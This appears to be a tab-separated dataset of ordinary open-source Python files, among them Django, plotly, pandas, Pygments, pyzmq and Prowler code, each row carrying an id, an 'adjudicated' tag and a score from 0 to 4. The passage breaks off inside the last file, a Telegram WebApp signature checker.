9	adjudicated	4	"#!/usr/bin/env python3<<NEWL>># Copyright (c) 2011 Google Inc. All rights reserved.<<NEWL>># Use of this source code is governed by a BSD-style license that can be<<NEWL>># found in the LICENSE file.<<NEWL>><<NEWL>>""""""These functions are executed via gyp-flock-tool when using the Makefile<<NEWL>>generator.  Used on systems that don't have a built-in flock.""""""<<NEWL>><<NEWL>>import fcntl<<NEWL>>import os<<NEWL>>import struct<<NEWL>>import subprocess<<NEWL>>import sys<<NEWL>><<NEWL>><<NEWL>>def main(args):<<NEWL>>    executor = FlockTool()<<NEWL>>    executor.Dispatch(args)<<NEWL>><<NEWL>><<NEWL>>class FlockTool:<<NEWL>>    """"""This class emulates the 'flock' command.""""""<<NEWL>><<NEWL>>    def Dispatch(self, args):<<NEWL>>        """"""Dispatches a string command to a method.""""""<<NEWL>>        if len(args) < 1:<<NEWL>>            raise Exception(""Not enough arguments"")<<NEWL>><<NEWL>>        method = ""Exec%s"" % self._CommandifyName(args[0])<<NEWL>>        getattr(self, method)(*args[1:])<<NEWL>><<NEWL>>    def _CommandifyName(self, name_string):<<NEWL>>        """"""Transforms a tool name like copy-info-plist to CopyInfoPlist""""""<<NEWL>>        return name_string.title().replace(""-"", """")<<NEWL>><<NEWL>>    def ExecFlock(self, lockfile, *cmd_list):<<NEWL>>        """"""Emulates the most basic behavior of Linux's flock(1).""""""<<NEWL>>        # Rely on exception handling to report errors.<<NEWL>>        # Note that the stock python on SunOS has a bug<<NEWL>>        # where fcntl.flock(fd, LOCK_EX) always fails<<NEWL>>        # with EBADF, that's why we use this F_SETLK<<NEWL>>        # hack instead.<<NEWL>>        fd = os.open(lockfile, os.O_WRONLY | os.O_NOCTTY | os.O_CREAT, 0o666)<<NEWL>>        if sys.platform.startswith(""aix""):<<NEWL>>            # Python on AIX is compiled with LARGEFILE support, which changes the<<NEWL>>            # struct size.<<NEWL>>            op = struct.pack(""hhIllqq"", fcntl.F_WRLCK, 0, 0, 0, 0, 0, 0)<<NEWL>>        else:<<NEWL>>            op = struct.pack(""hhllhhl"", fcntl.F_WRLCK, 0, 0, 0, 0, 0, 0)<<NEWL>>        fcntl.fcntl(fd, fcntl.F_SETLK, op)<<NEWL>>        return subprocess.call(cmd_list)<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    sys.exit(main(sys.argv[1:]))"
149	adjudicated	0	# -*- coding: utf-8 -*-<<NEWL>>from django.contrib.admin import FieldListFilter<<NEWL>>from django.contrib.admin.utils import prepare_lookup_value<<NEWL>>from django.utils.translation import gettext_lazy as _<<NEWL>><<NEWL>><<NEWL>>class NullFieldListFilter(FieldListFilter):<<NEWL>>    def __init__(self, field, request, params, model, model_admin, field_path):<<NEWL>>        self.lookup_kwarg = '{0}__isnull'.format(field_path)<<NEWL>>        super().__init__(field, request, params, model, model_admin, field_path)<<NEWL>>        lookup_choices = self.lookups(request, model_admin)<<NEWL>>        self.lookup_choices = () if lookup_choices is None else list(lookup_choices)<<NEWL>><<NEWL>>    def expected_parameters(self):<<NEWL>>        return [self.lookup_kwarg]<<NEWL>><<NEWL>>    def value(self):<<NEWL>>        return self.used_parameters.get(self.lookup_kwarg, None)<<NEWL>><<NEWL>>    def lookups(self, request, model_admin):<<NEWL>>        return (<<NEWL>>            ('1', _('Yes')),<<NEWL>>            ('0', _('No')),<<NEWL>>        )<<NEWL>><<NEWL>>    def choices(self, cl):<<NEWL>>        yield {<<NEWL>>            'selected': self.value() is None,<<NEWL>>            'query_string': cl.get_query_string({}, [self.lookup_kwarg]),<<NEWL>>            'display': _('All'),<<NEWL>>        }<<NEWL>>        for lookup, title in self.lookup_choices:<<NEWL>>            yield {<<NEWL>>                'selected': self.value() == prepare_lookup_value(self.lookup_kwarg, lookup),<<NEWL>>                'query_string': cl.get_query_string({<<NEWL>>                    self.lookup_kwarg: lookup,<<NEWL>>                }, []),<<NEWL>>                'display': title,<<NEWL>>            }<<NEWL>><<NEWL>>    def queryset(self, request, queryset):<<NEWL>>        if self.value() is not None:<<NEWL>>            kwargs = {self.lookup_kwarg: self.value()}<<NEWL>>            return queryset.filter(**kwargs)<<NEWL>>        return queryset<<NEWL>><<NEWL>><<NEWL>>class NotNullFieldListFilter(NullFieldListFilter):<<NEWL>>    def lookups(self, request, model_admin):<<NEWL>>        return (<<NEWL>>            ('0', _('Yes')),<<NEWL>>            ('1', _('No')),<<NEWL>>        )
58	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""hoverlabel"", parent_name=""scatterpolargl"", **kwargs<<NEWL>>    ):<<NEWL>>        super(HoverlabelValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            align<<NEWL>>                Sets the horizontal alignment of the text<<NEWL>>                content within hover label box. Has an effect<<NEWL>>                only if the hover label text spans more two or<<NEWL>>                more lines<<NEWL>>            alignsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `align`.<<NEWL>>            bgcolor<<NEWL>>                Sets the background color of the hover labels<<NEWL>>                for this trace<<NEWL>>            bgcolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bgcolor`.<<NEWL>>            bordercolor<<NEWL>>                Sets the border color of the hover labels for<<NEWL>>                this trace.<<NEWL>>            bordercolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bordercolor`.<<NEWL>>            font<<NEWL>>                Sets the font used in hover labels.<<NEWL>>            namelength<<NEWL>>                Sets the default length (in number of<<NEWL>>                characters) of the trace name in the hover<<NEWL>>                labels for all traces. -1 shows the whole name<<NEWL>>                regardless of length. 0-3 shows the first 0-3<<NEWL>>                characters, and an integer >3 will show the<<NEWL>>                whole name if it is less than that many<<NEWL>>                characters, but if it is longer, will truncate<<NEWL>>                to `namelength - 3` characters and add an<<NEWL>>                ellipsis.<<NEWL>>            namelengthsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `namelength`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
118	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""font"", parent_name=""candlestick.hoverlabel"", **kwargs<<NEWL>>    ):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
108	adjudicated	4	"""""""<<NEWL>>Validator for a regular language.<<NEWL>>""""""<<NEWL>>from typing import Dict<<NEWL>><<NEWL>>from prompt_toolkit.document import Document<<NEWL>>from prompt_toolkit.validation import ValidationError, Validator<<NEWL>><<NEWL>>from .compiler import _CompiledGrammar<<NEWL>><<NEWL>>__all__ = [<<NEWL>>    ""GrammarValidator"",<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>class GrammarValidator(Validator):<<NEWL>>    """"""<<NEWL>>    Validator which can be used for validation according to variables in<<NEWL>>    the grammar. Each variable can have its own validator.<<NEWL>><<NEWL>>    :param compiled_grammar: `GrammarCompleter` instance.<<NEWL>>    :param validators: `dict` mapping variable names of the grammar to the<<NEWL>>                       `Validator` instances to be used for each variable.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(<<NEWL>>        self, compiled_grammar: _CompiledGrammar, validators: Dict[str, Validator]<<NEWL>>    ) -> None:<<NEWL>><<NEWL>>        self.compiled_grammar = compiled_grammar<<NEWL>>        self.validators = validators<<NEWL>><<NEWL>>    def validate(self, document: Document) -> None:<<NEWL>>        # Parse input document.<<NEWL>>        # We use `match`, not `match_prefix`, because for validation, we want<<NEWL>>        # the actual, unambiguous interpretation of the input.<<NEWL>>        m = self.compiled_grammar.match(document.text)<<NEWL>><<NEWL>>        if m:<<NEWL>>            for v in m.variables():<<NEWL>>                validator = self.validators.get(v.varname)<<NEWL>><<NEWL>>                if validator:<<NEWL>>                    # Unescape text.<<NEWL>>                    unwrapped_text = self.compiled_grammar.unescape(v.varname, v.value)<<NEWL>><<NEWL>>                    # Create a document, for the completions API (text/cursor_position)<<NEWL>>                    inner_document = Document(unwrapped_text, len(unwrapped_text))<<NEWL>><<NEWL>>                    try:<<NEWL>>                        validator.validate(inner_document)<<NEWL>>                    except ValidationError as e:<<NEWL>>                        raise ValidationError(<<NEWL>>                            cursor_position=v.start + e.cursor_position,<<NEWL>>                            message=e.message,<<NEWL>>                        ) from e<<NEWL>>        else:<<NEWL>>            raise ValidationError(<<NEWL>>                cursor_position=len(document.text), message=""Invalid command""<<NEWL>>            )"
48	adjudicated	0	"from prowler.lib.check.models import Check, Check_Report_AWS<<NEWL>>from prowler.providers.aws.services.opensearch.opensearch_client import (<<NEWL>>    opensearch_client,<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>>class opensearch_service_domains_cloudwatch_logging_enabled(Check):<<NEWL>>    def execute(self):<<NEWL>>        findings = []<<NEWL>>        for domain in opensearch_client.opensearch_domains:<<NEWL>>            report = Check_Report_AWS(self.metadata())<<NEWL>>            report.region = domain.region<<NEWL>>            report.resource_id = domain.name<<NEWL>>            report.resource_arn = domain.arn<<NEWL>>            report.status = ""FAIL""<<NEWL>>            report.status_extended = f""Opensearch domain {domain.name} SEARCH_SLOW_LOGS and INDEX_SLOW_LOGS disabled""<<NEWL>>            has_SEARCH_SLOW_LOGS = False<<NEWL>>            has_INDEX_SLOW_LOGS = False<<NEWL>>            for logging_item in domain.logging:<<NEWL>>                if logging_item.name == ""SEARCH_SLOW_LOGS"" and logging_item.enabled:<<NEWL>>                    has_SEARCH_SLOW_LOGS = True<<NEWL>>                if logging_item.name == ""INDEX_SLOW_LOGS"" and logging_item.enabled:<<NEWL>>                    has_INDEX_SLOW_LOGS = True<<NEWL>><<NEWL>>            if has_SEARCH_SLOW_LOGS and has_INDEX_SLOW_LOGS:<<NEWL>>                report.status = ""PASS""<<NEWL>>                report.status_extended = f""Opensearch domain {domain.name} SEARCH_SLOW_LOGS and INDEX_SLOW_LOGS enabled""<<NEWL>>            elif not has_SEARCH_SLOW_LOGS and has_INDEX_SLOW_LOGS:<<NEWL>>                report.status = ""FAIL""<<NEWL>>                report.status_extended = f""Opensearch domain {domain.name} INDEX_SLOW_LOGS enabled but SEARCH_SLOW_LOGS disabled""<<NEWL>>            elif not has_INDEX_SLOW_LOGS and has_SEARCH_SLOW_LOGS:<<NEWL>>                report.status = ""FAIL""<<NEWL>>                report.status_extended = f""Opensearch domain {domain.name} SEARCH_SLOW_LOGS enabled but INDEX_SLOW_LOGS disabled""<<NEWL>><<NEWL>>            findings.append(report)<<NEWL>><<NEWL>>        return findings"
159	adjudicated	3	"""""""Models an on/off device.""""""<<NEWL>>from __future__ import annotations<<NEWL>>from typing import Any<<NEWL>><<NEWL>>from .. import ApiSession<<NEWL>>from ..info import HomeInfo<<NEWL>><<NEWL>>from .device import Device<<NEWL>>from .const import DeviceType, DeviceTypeId<<NEWL>><<NEWL>><<NEWL>>class OnOffDevice(Device):<<NEWL>>    """"""Models an on/off device with a single on/off state and command.""""""<<NEWL>><<NEWL>>    def __init__(<<NEWL>>        self,<<NEWL>>        session: ApiSession,<<NEWL>>        home: HomeInfo,<<NEWL>>        data: dict,<<NEWL>>        device_type: DeviceType,<<NEWL>>        device_type_id: int<<NEWL>>    ) -> None:<<NEWL>>        super().__init__(session, home, data, device_type, device_type_id, do_update=False)<<NEWL>>        self.is_on: bool = False<<NEWL>>        self.update(data)<<NEWL>><<NEWL>>    def update(self, data: dict[str, Any]):<<NEWL>>        """"""Update the radiator from cloud API data.""""""<<NEWL>>        super().update(data)<<NEWL>>        self.is_on = data[""on_off""] == ""1""<<NEWL>><<NEWL>>    async def set_onoff_state(self, turn_on: bool):<<NEWL>>        """"""Set the onoff state, on (true) or off (false)""""""<<NEWL>>        if turn_on == self.is_on:<<NEWL>>            return<<NEWL>><<NEWL>>        query_params = {}<<NEWL>>        query_params[""id_device""] = self.id_local<<NEWL>>        query_params[""on_off""] = ""1"" if turn_on else ""0""<<NEWL>>        query_params[""nv_mode""] = self.device_type_id<<NEWL>>        query_params[""gv_mode""] = self.device_type_id<<NEWL>><<NEWL>>        await self._session.write_query(self.home.home_id, query_params)<<NEWL>><<NEWL>>        # This is debatable - for some scenarios it is reasonable to<<NEWL>>        # update the value in the current object with the assumed<<NEWL>>        # change, for others not<<NEWL>>        self.is_on = turn_on<<NEWL>><<NEWL>>class Light(OnOffDevice):<<NEWL>>    """"""Models a light.""""""<<NEWL>><<NEWL>>    def __init__(<<NEWL>>        self,<<NEWL>>        session: ApiSession,<<NEWL>>        home: HomeInfo,<<NEWL>>        data: dict<<NEWL>>    ) -> None:<<NEWL>>        super().__init__(session, home, data, DeviceType.LIGHT, DeviceTypeId.LIGHT)<<NEWL>><<NEWL>>class Outlet(OnOffDevice):<<NEWL>>    """"""Models an outlet.""""""<<NEWL>><<NEWL>>    def __init__(<<NEWL>>        self,<<NEWL>>        session: ApiSession,<<NEWL>>        home: HomeInfo,<<NEWL>>        data: dict<<NEWL>>    ) -> None:<<NEWL>>        super().__init__(session, home, data, DeviceType.OUTLET, DeviceTypeId.OUTLET)"
19	adjudicated	2	"#!/usr/bin/env python3<<NEWL>>#<<NEWL>># Make a DWIN .ico file from a directory of JPEG icon files.<<NEWL>>#<<NEWL>>#  Copyright (c) 2020 Brent Burton<<NEWL>>#<<NEWL>>#  This program is free software: you can redistribute it and/or modify<<NEWL>>#  it under the terms of the GNU General Public License as published by<<NEWL>>#  the Free Software Foundation, either version 3 of the License, or<<NEWL>>#  (at your option) any later version.<<NEWL>>#<<NEWL>>#  This program is distributed in the hope that it will be useful,<<NEWL>>#  but WITHOUT ANY WARRANTY; without even the implied warranty of<<NEWL>>#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the<<NEWL>>#  GNU General Public License for more details.<<NEWL>>#<<NEWL>>#  You should have received a copy of the GNU General Public License<<NEWL>>#  along with this program.  If not, see <https://www.gnu.org/licenses/>.<<NEWL>>#----------------------------------------------------------------<<NEWL>><<NEWL>>import os.path<<NEWL>>import argparse<<NEWL>>import DWIN_ICO<<NEWL>><<NEWL>>version = '2.0.7'<<NEWL>><<NEWL>>#----------------<<NEWL>>if __name__ == '__main__':<<NEWL>>    try:<<NEWL>>        parser = argparse.ArgumentParser(description='Make .ico from JPEG files')<<NEWL>>        parser.add_argument('iconDir', type=str, nargs=1,<<NEWL>>                            help='name of directory containing icon JPGs')<<NEWL>>        parser.add_argument('filename', type=str, nargs=1,<<NEWL>>                            help='name of new .ico file to create')<<NEWL>>        args = parser.parse_args()<<NEWL>><<NEWL>>        filename = args.filename[0]<<NEWL>>        iconDir = args.iconDir[0]<<NEWL>><<NEWL>>        if os.path.isfile(filename):<<NEWL>>            raise RuntimeError(""ICO file '%s' already exists."" % (filename))<<NEWL>><<NEWL>>        if not os.path.exists(iconDir):<<NEWL>>            raise RuntimeError(""Icon directory '%s' doesn't exist."" % (iconDir))<<NEWL>><<NEWL>>        print(""Making .ico file '%s' from contents of '%s'"" % (filename, iconDir))<<NEWL>>        ico = DWIN_ICO.DWIN_ICO_File()<<NEWL>>        ico.createFile(iconDir, filename)<<NEWL>><<NEWL>>    except Exception as e:<<NEWL>>        print('Error: ', e)<<NEWL>>"
388	adjudicated	2	"class BaseInstanceLoader:<<NEWL>>    """"""<<NEWL>>    Base abstract implementation of instance loader.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(self, resource, dataset=None):<<NEWL>>        self.resource = resource<<NEWL>>        self.dataset = dataset<<NEWL>><<NEWL>>    def get_instance(self, row):<<NEWL>>        raise NotImplementedError<<NEWL>><<NEWL>><<NEWL>>class ModelInstanceLoader(BaseInstanceLoader):<<NEWL>>    """"""<<NEWL>>    Instance loader for Django model.<<NEWL>><<NEWL>>    Lookup for model instance by ``import_id_fields``.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def get_queryset(self):<<NEWL>>        return self.resource.get_queryset()<<NEWL>><<NEWL>>    def get_instance(self, row):<<NEWL>>        try:<<NEWL>>            params = {}<<NEWL>>            for key in self.resource.get_import_id_fields():<<NEWL>>                field = self.resource.fields[key]<<NEWL>>                params[field.attribute] = field.clean(row)<<NEWL>>            if params:<<NEWL>>                return self.get_queryset().get(**params)<<NEWL>>            else:<<NEWL>>                return None<<NEWL>>        except self.resource._meta.model.DoesNotExist:<<NEWL>>            return None<<NEWL>><<NEWL>><<NEWL>>class CachedInstanceLoader(ModelInstanceLoader):<<NEWL>>    """"""<<NEWL>>    Loads all possible model instances in dataset avoid hitting database for<<NEWL>>    every ``get_instance`` call.<<NEWL>><<NEWL>>    This instance loader work only when there is one ``import_id_fields``<<NEWL>>    field.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(self, *args, **kwargs):<<NEWL>>        super().__init__(*args, **kwargs)<<NEWL>><<NEWL>>        pk_field_name = self.resource.get_import_id_fields()[0]<<NEWL>>        self.pk_field = self.resource.fields[pk_field_name]<<NEWL>><<NEWL>>        ids = [self.pk_field.clean(row) for row in self.dataset.dict]<<NEWL>>        qs = self.get_queryset().filter(**{<<NEWL>>            ""%s__in"" % self.pk_field.attribute: ids<<NEWL>>            })<<NEWL>><<NEWL>>        self.all_instances = {<<NEWL>>            self.pk_field.get_value(instance): instance<<NEWL>>            for instance in qs<<NEWL>>        }<<NEWL>><<NEWL>>    def get_instance(self, row):<<NEWL>>        return self.all_instances.get(self.pk_field.clean(row))"
497	adjudicated	3	"""""""miscellaneous zmq_utils wrapping""""""<<NEWL>><<NEWL>># Copyright (C) PyZMQ Developers<<NEWL>># Distributed under the terms of the Modified BSD License.<<NEWL>><<NEWL>>from zmq.error import InterruptedSystemCall, _check_rc, _check_version<<NEWL>><<NEWL>>from ._cffi import ffi<<NEWL>>from ._cffi import lib as C<<NEWL>><<NEWL>><<NEWL>>def has(capability):<<NEWL>>    """"""Check for zmq capability by name (e.g. 'ipc', 'curve')<<NEWL>><<NEWL>>    .. versionadded:: libzmq-4.1<<NEWL>>    .. versionadded:: 14.1<<NEWL>>    """"""<<NEWL>>    _check_version((4, 1), 'zmq.has')<<NEWL>>    if isinstance(capability, str):<<NEWL>>        capability = capability.encode('utf8')<<NEWL>>    return bool(C.zmq_has(capability))<<NEWL>><<NEWL>><<NEWL>>def curve_keypair():<<NEWL>>    """"""generate a Z85 key pair for use with zmq.CURVE security<<NEWL>><<NEWL>>    Requires libzmq (â¥ 4.0) to have been built with CURVE support.<<NEWL>><<NEWL>>    Returns<<NEWL>>    -------<<NEWL>>    (public, secret) : two bytestrings<<NEWL>>        The public and private key pair as 40 byte z85-encoded bytestrings.<<NEWL>>    """"""<<NEWL>>    _check_version((3, 2), ""curve_keypair"")<<NEWL>>    public = ffi.new('char[64]')<<NEWL>>    private = ffi.new('char[64]')<<NEWL>>    rc = C.zmq_curve_keypair(public, private)<<NEWL>>    _check_rc(rc)<<NEWL>>    return ffi.buffer(public)[:40], ffi.buffer(private)[:40]<<NEWL>><<NEWL>><<NEWL>>def curve_public(private):<<NEWL>>    """"""Compute the public key corresponding to a private key for use<<NEWL>>    with zmq.CURVE security<<NEWL>><<NEWL>>    Requires libzmq (â¥ 4.2) to have been built with CURVE support.<<NEWL>><<NEWL>>    Parameters<<NEWL>>    ----------<<NEWL>>    private<<NEWL>>        The private key as a 40 byte z85-encoded bytestring<<NEWL>>    Returns<<NEWL>>    -------<<NEWL>>    bytestring<<NEWL>>        The public key as a 40 byte z85-encoded bytestring.<<NEWL>>    """"""<<NEWL>>    if isinstance(private, str):<<NEWL>>        private = private.encode('utf8')<<NEWL>>    _check_version((4, 2), ""curve_public"")<<NEWL>>    public = ffi.new('char[64]')<<NEWL>>    rc = C.zmq_curve_public(public, private)<<NEWL>>    _check_rc(rc)<<NEWL>>    return ffi.buffer(public)[:40]<<NEWL>><<NEWL>><<NEWL>>def _retry_sys_call(f, *args, **kwargs):<<NEWL>>    """"""make a call, retrying if interrupted with EINTR""""""<<NEWL>>    while True:<<NEWL>>        rc = f(*args)<<NEWL>>        try:<<NEWL>>            _check_rc(rc)<<NEWL>>        except InterruptedSystemCall:<<NEWL>>            continue<<NEWL>>        else:<<NEWL>>            break<<NEWL>><<NEWL>><<NEWL>>__all__ = ['has', 'curve_keypair', 'curve_public']"
464	adjudicated	1	"import os<<NEWL>><<NEWL>>import pytest<<NEWL>><<NEWL>>import pandas.compat as compat<<NEWL>><<NEWL>>import pandas._testing as tm<<NEWL>><<NEWL>><<NEWL>>def test_rands():<<NEWL>>    r = tm.rands(10)<<NEWL>>    assert len(r) == 10<<NEWL>><<NEWL>><<NEWL>>def test_rands_array_1d():<<NEWL>>    arr = tm.rands_array(5, size=10)<<NEWL>>    assert arr.shape == (10,)<<NEWL>>    assert len(arr[0]) == 5<<NEWL>><<NEWL>><<NEWL>>def test_rands_array_2d():<<NEWL>>    arr = tm.rands_array(7, size=(10, 10))<<NEWL>>    assert arr.shape == (10, 10)<<NEWL>>    assert len(arr[1, 1]) == 7<<NEWL>><<NEWL>><<NEWL>>def test_numpy_err_state_is_default():<<NEWL>>    expected = {""over"": ""warn"", ""divide"": ""warn"", ""invalid"": ""warn"", ""under"": ""ignore""}<<NEWL>>    import numpy as np<<NEWL>><<NEWL>>    # The error state should be unchanged after that import.<<NEWL>>    assert np.geterr() == expected<<NEWL>><<NEWL>><<NEWL>>def test_convert_rows_list_to_csv_str():<<NEWL>>    rows_list = [""aaa"", ""bbb"", ""ccc""]<<NEWL>>    ret = tm.convert_rows_list_to_csv_str(rows_list)<<NEWL>><<NEWL>>    if compat.is_platform_windows():<<NEWL>>        expected = ""aaa\r\nbbb\r\nccc\r\n""<<NEWL>>    else:<<NEWL>>        expected = ""aaa\nbbb\nccc\n""<<NEWL>><<NEWL>>    assert ret == expected<<NEWL>><<NEWL>><<NEWL>>def test_create_temp_directory():<<NEWL>>    with tm.ensure_clean_dir() as path:<<NEWL>>        assert os.path.exists(path)<<NEWL>>        assert os.path.isdir(path)<<NEWL>>    assert not os.path.exists(path)<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.parametrize(""strict_data_files"", [True, False])<<NEWL>>def test_datapath_missing(datapath):<<NEWL>>    with pytest.raises(ValueError, match=""Could not find file""):<<NEWL>>        datapath(""not_a_file"")<<NEWL>><<NEWL>><<NEWL>>def test_datapath(datapath):<<NEWL>>    args = (""io"", ""data"", ""csv"", ""iris.csv"")<<NEWL>><<NEWL>>    result = datapath(*args)<<NEWL>>    expected = os.path.join(os.path.dirname(os.path.dirname(__file__)), *args)<<NEWL>><<NEWL>>    assert result == expected<<NEWL>><<NEWL>><<NEWL>>def test_rng_context():<<NEWL>>    import numpy as np<<NEWL>><<NEWL>>    expected0 = 1.764052345967664<<NEWL>>    expected1 = 1.6243453636632417<<NEWL>><<NEWL>>    with tm.RNGContext(0):<<NEWL>>        with tm.RNGContext(1):<<NEWL>>            assert np.random.randn() == expected1<<NEWL>>        assert np.random.randn() == expected0<<NEWL>><<NEWL>><<NEWL>>def test_external_error_raised():<<NEWL>>    with tm.external_error_raised(TypeError):<<NEWL>>        raise TypeError(""Should not check this error message, so it will pass"")"
435	adjudicated	3	"""""""<<NEWL>>    pygments.lexers.sgf<<NEWL>>    ~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    Lexer for Smart Game Format (sgf) file format.<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.lexer import RegexLexer, bygroups<<NEWL>>from pygments.token import Name, Literal, String, Text, Punctuation, Whitespace<<NEWL>><<NEWL>>__all__ = [""SmartGameFormatLexer""]<<NEWL>><<NEWL>><<NEWL>>class SmartGameFormatLexer(RegexLexer):<<NEWL>>    """"""<<NEWL>>    Lexer for Smart Game Format (sgf) file format.<<NEWL>><<NEWL>>    The format is used to store game records of board games for two players<<NEWL>>    (mainly Go game).<<NEWL>><<NEWL>>    .. versionadded:: 2.4<<NEWL>>    """"""<<NEWL>>    name = 'SmartGameFormat'<<NEWL>>    url = 'https://www.red-bean.com/sgf/'<<NEWL>>    aliases = ['sgf']<<NEWL>>    filenames = ['*.sgf']<<NEWL>><<NEWL>>    tokens = {<<NEWL>>        'root': [<<NEWL>>            (r'[():;]+', Punctuation),<<NEWL>>            # tokens:<<NEWL>>            (r'(A[BW]|AE|AN|AP|AR|AS|[BW]L|BM|[BW]R|[BW]S|[BW]T|CA|CH|CP|CR|'<<NEWL>>             r'DD|DM|DO|DT|EL|EV|EX|FF|FG|G[BW]|GC|GM|GN|HA|HO|ID|IP|IT|IY|KM|'<<NEWL>>             r'KO|LB|LN|LT|L|MA|MN|M|N|OB|OM|ON|OP|OT|OV|P[BW]|PC|PL|PM|RE|RG|'<<NEWL>>             r'RO|RU|SO|SC|SE|SI|SL|SO|SQ|ST|SU|SZ|T[BW]|TC|TE|TM|TR|UC|US|VW|'<<NEWL>>             r'V|[BW]|C)',<<NEWL>>             Name.Builtin),<<NEWL>>            # number:<<NEWL>>            (r'(\[)([0-9.]+)(\])',<<NEWL>>             bygroups(Punctuation, Literal.Number, Punctuation)),<<NEWL>>            # date:<<NEWL>>            (r'(\[)([0-9]{4}-[0-9]{2}-[0-9]{2})(\])',<<NEWL>>             bygroups(Punctuation, Literal.Date, Punctuation)),<<NEWL>>            # point:<<NEWL>>            (r'(\[)([a-z]{2})(\])',<<NEWL>>             bygroups(Punctuation, String, Punctuation)),<<NEWL>>            # double points:<<NEWL>>            (r'(\[)([a-z]{2})(:)([a-z]{2})(\])',<<NEWL>>             bygroups(Punctuation, String, Punctuation, String, Punctuation)),<<NEWL>><<NEWL>>            (r'(\[)([\w\s#()+,\-.:?]+)(\])',<<NEWL>>             bygroups(Punctuation, String, Punctuation)),<<NEWL>>            (r'(\[)(\s.*)(\])',<<NEWL>>             bygroups(Punctuation, Whitespace, Punctuation)),<<NEWL>>            (r'\s+', Whitespace)<<NEWL>>        ],<<NEWL>>    }"
401	adjudicated	3	"import hashlib<<NEWL>>import hmac<<NEWL>>from operator import itemgetter<<NEWL>>from typing import Callable, Any, Dict<<NEWL>>from urllib.parse import parse_qsl<<NEWL>><<NEWL>><<NEWL>>def check_webapp_signature(token: str, init_data: str) -> bool:<<NEWL>>    """"""<<NEWL>>    Check incoming WebApp init data signature<<NEWL>><<NEWL>>    Source: https://core.telegram.org/bots/webapps#validating-data-received-via-the-web-app<<NEWL>><<NEWL>>    :param token:<<NEWL>>    :param init_data:<<NEWL>>    :return:<<NEWL>>    """"""<<NEWL>>    try:<<NEWL>>        parsed_data = dict(parse_qsl(init_data))<<NEWL>>    except ValueError:<<NEWL>>        # Init data is not a valid query string<<NEWL>>        return False<<NEWL>>    if ""hash"" not in parsed_data:<<NEWL>>        # Hash is not present in init data<<NEWL>>        return False<<NEWL>><<NEWL>>    hash_ = parsed_data.pop('hash')<<NEWL>>    data_check_string = ""\n"".join(<<NEWL>>        f""{k}={v}"" for k, v in sorted(parsed_data.items(), key=itemgetter(0))<<NEWL>>    )<<NEWL>>    secret_key = hmac.new(<<NEWL>>        key=b""WebAppData"", msg=token.encode(), digestmod=hashlib.sha256<<NEWL>>    )<<NEWL>>    calculated_hash = hmac.new(<<NEWL>>        key=secret_key.digest(), msg=data_check_string.encode(), digestmod=hashlib.sha256<<NEWL>>    ).hexdigest()<<NEWL>>    return calculated_hash == hash_<<NEWL>><<NEWL>><<NEWL>>def parse_init_data(init_data: str, _loads: Callable[..., Any]) -> Dict[str, Any]:<<NEWL>>    """"""<<NEWL>>    Parse WebApp init data and return it as dict<<NEWL>><<NEWL>>    :param init_data:<<NEWL>>    :param _loads:<<NEWL>>    :return:<<NEWL>>    """"""<<NEWL>>    result = 